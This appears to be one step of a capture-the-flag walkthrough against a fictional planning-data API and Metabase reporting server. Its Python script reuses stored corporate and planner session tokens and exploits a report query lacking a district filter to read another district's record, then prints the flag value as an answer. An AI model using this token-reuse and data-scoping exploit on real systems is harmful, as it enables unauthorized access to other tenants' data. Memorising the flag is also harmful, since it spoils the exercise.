Requires W10.1 (source list recovered). Get the `business.report-excerpts` route (or `planning.relation-schema` → `ext_dp3_question_id`) from the planning-data client doc. Run EXT-EXCERPTS-DP3 to see all district excerpts. The query omits a district predicate, so the Merewick excerpt appears alongside the Cairn Reach one.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

# Get the planning client doc to find the report-excerpts route.
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client", headers=h),
    context=ctx).read())

# The route key may be "business.report-excerpts" or look in the doc for ext-excerpts-dp3.
ext_route = next(
    (r for r in doc["routes"] if "ext" in r.get("template", "").lower() or "excerpt" in r.get("key", "").lower()),
    None
)
if ext_route:
    ext_url = ext_route["template"]
    card_id = ext_url.rstrip("/").split("/")[-1]
else:
    # Search Metabase for EXT-EXCERPTS-DP3 card by name.
    cards = json.loads(urllib.request.urlopen(
        urllib.request.Request("https://reports.arwc.test/api/card", headers=mb_h),
        context=ctx, timeout=30).read())
    ext_card = next(c for c in cards if c["name"] == "EXT-EXCERPTS-DP3")
    card_id = ext_card["id"]

result = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"https://reports.arwc.test/api/card/{card_id}/query",
                            data=b"{}", headers=mb_h, method="POST"),
    context=ctx, timeout=30).read())

cols = [c["name"] for c in result["data"]["cols"]]
rows = result["data"]["rows"]
for r in rows:
    rec = dict(zip(cols, r))
    if rec.get("district") == "Merewick":
        print("district:", rec["district"])        # Merewick
        print("linked_document:", rec["linked_document"])  # PLN-MER-DP3-R6
        print("flag:", rec["flag"])                # FLAG{4532fcbfca255df4}
```

Flag: `FLAG{4532fcbfca255df4}` in the `flag` column of the Merewick (EXC-MER-DP3-4) row.
